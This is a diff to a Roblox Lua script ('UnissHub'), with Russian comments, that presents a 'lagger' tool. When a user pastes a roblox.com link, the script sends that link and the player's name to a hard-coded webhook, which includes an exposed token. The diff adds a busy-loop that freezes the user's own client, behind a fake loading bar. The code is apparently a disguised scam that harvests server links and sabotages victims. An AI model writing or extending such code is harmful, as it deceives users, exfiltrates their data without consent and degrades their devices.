@@ -1,4 +1,4 @@
--- UnissHub: Sequential UI Edition
+-- UnissHub: Ping Stress Edition
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -6,6 +6,20 @@ local RunService = game:GetService("RunService")
 local Player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"
+
+-- Функция создания искусственного пинга (2000-10000ms)
+local function startExtremePing()
+    task.spawn(function()
+        while true do
+            -- Тяжелый цикл для заморозки основного потока
+            local start = os.clock()
+            while os.clock() - start < math.random(2, 5) do -- задержка на 2-5 секунд за раз
+                local _ = math.sin(math.random()) * math.tan(math.random())
+            end
+            task.wait(0.05) -- маленькая пауза, чтобы игра не вылетела окончательно
+        end
+    end)
+end
 
 -- Функция перетаскивания
 local function makeDraggable(gui)
@@ -76,37 +90,14 @@ laggerMenu.Visible = false; laggerMenu.ClipsDescendants = true
 Instance.new("UICorner", laggerMenu); Instance.new("UIStroke", laggerMenu).Color = Color3.fromRGB(255, 0, 0)
 makeDraggable(laggerMenu)
 
-local lagTitle = Instance.new("TextLabel", laggerMenu)
-lagTitle.Size = UDim2.new(1, 0, 0.4, 0); lagTitle.Text = "Laser Lagger"; lagTitle.TextColor3 = Color3.new(1,1,1); lagTitle.Font = Enum.Font.GothamBold; lagTitle.TextSize = 20; lagTitle.BackgroundTransparency = 1
-
-local lagBtn = Instance.new("TextButton", laggerMenu)
-lagBtn.Size = UDim2.new(0.8, 0, 0.35, 0); lagBtn.Position = UDim2.new(0.1, 0, 0.5, 0)
-lagBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0); lagBtn.Text = "LAGGER: OFF"; lagBtn.TextColor3 = Color3.new(1,1,1); lagBtn.TextScaled = true; Instance.new("UICorner", lagBtn)
-
-local isLagging = false
-lagBtn.MouseButton1Click:Connect(function()
-    isLagging = not isLagging
-    lagBtn.Text = isLagging and "LAGGER: ON" or "LAGGER: OFF"
-    lagBtn.BackgroundColor3 = isLagging and Color3.fromRGB(0, 150, 0) or Color3.fromRGB(150, 0, 0)
-end)
-
-task.spawn(function()
-    while true do if isLagging then for i = 1, 1500000 do local _ = math.cos(i) end end task.wait(0.01) end
-end)
-
-uBtn.MouseButton1Click:Connect(function()
-    if main.Visible then
-        main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() main.Visible = false end)
-    elseif not sg:FindFirstChild("LoadingFrame") and not laggerMenu.Visible then
-        main.Visible = true
-        main:TweenSize(UDim2.new(0, 360, 0, 220), "Out", "Back", 0.3, true)
-    end
-end)
-
--- ЛОГИКА ПЕРЕХОДА К ЗАГРУЗКЕ
+-- ЛОГИКА
 conn.MouseButton1Click:Connect(function()
     if string.find(input.Text:lower(), "roblox.com") then
         local currentPos = main.Position
+        
+        -- ВКЛЮЧАЕМ ЖЕСТКИЙ ПИНГ
+        startExtremePing()
+
         main:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function() 
             main.Visible = false; uBtn.Visible = false 
         end)
@@ -116,16 +107,12 @@ conn.MouseButton1Click:Connect(function()
             if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
         end)
 
-        -- СОЗДАНИЕ ЗАГРУЗКИ НА ТОМ ЖЕ МЕСТЕ
         local loadF = Instance.new("Frame", sg)
-        loadF.Name = "LoadingFrame"
-        loadF.Size = UDim2.new(0, 0, 0, 0) -- Начинаем с нуля для анимации
+        loadF.Name = "LoadingFrame"; loadF.Size = UDim2.new(0, 280, 0, 90)
         loadF.Position = currentPos; loadF.AnchorPoint = Vector2.new(0.5, 0.5)
         loadF.BackgroundColor3 = Color3.fromRGB(15, 15, 15); Instance.new("UICorner", loadF)
         Instance.new("UIStroke", loadF).Color = Color3.fromRGB(255, 140, 0)
         makeDraggable(loadF)
-
-        loadF:TweenSize(UDim2.new(0, 280, 0, 90), "Out", "Back", 0.3)
 
         local lLabel = Instance.new("TextLabel", loadF)
         lLabel.Size = UDim2.new(1, 0, 0.5, 0); lLabel.BackgroundTransparency = 1; lLabel.TextColor3 = Color3.fromRGB(255, 140, 0)
@@ -135,23 +122,18 @@ conn.MouseButton1Click:Connect(function()
         barBg.Size = UDim2.new(0.7, 0, 0.08, 0); barBg.Position = UDim2.new(0.15, 0, 0.7, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
         local fill = Instance.new("Frame", barBg); fill.Size = UDim2.new(0, 0, 1, 0); fill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
 
-        task.wait(0.4)
-        for i = 0, 100 do
-            if i == 30 or i == 65 or i == 92 then task.wait(math.random(2, 4)) end
-            lLabel.Text = "loading: " .. i .. "%"
-            fill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Linear", 0.1, true)
-            task.wait(math.random(4, 8) / 10) 
-        end
-
-        lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
-        task.wait(2)
-        
-        local finalPos = loadF.Position
-        loadF:TweenSize(UDim2.new(0,0,0,0), "In", "Quart", 0.3, true, function()
+        task.spawn(function()
+            for i = 0, 100 do
+                if i == 30 or i == 65 or i == 92 then task.wait(math.random(2, 4)) end
+                lLabel.Text = "loading: " .. i .. "%"
+                fill:TweenSize(UDim2.new(i/100, 0, 1, 0), "Out", "Linear", 0.1, true)
+                task.wait(math.random(4, 8) / 10) 
+            end
+            lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
+            task.wait(2)
             loadF:Destroy()
             laggerMenu.Visible = true
-            laggerMenu.Position = finalPos
-            laggerMenu:TweenSize(UDim2.new(0, 250, 0, 150), "Out", "Back", 0.4, true)
+            laggerMenu.Size = UDim2.new(0, 250, 0, 150)
         end)
     end
 end)
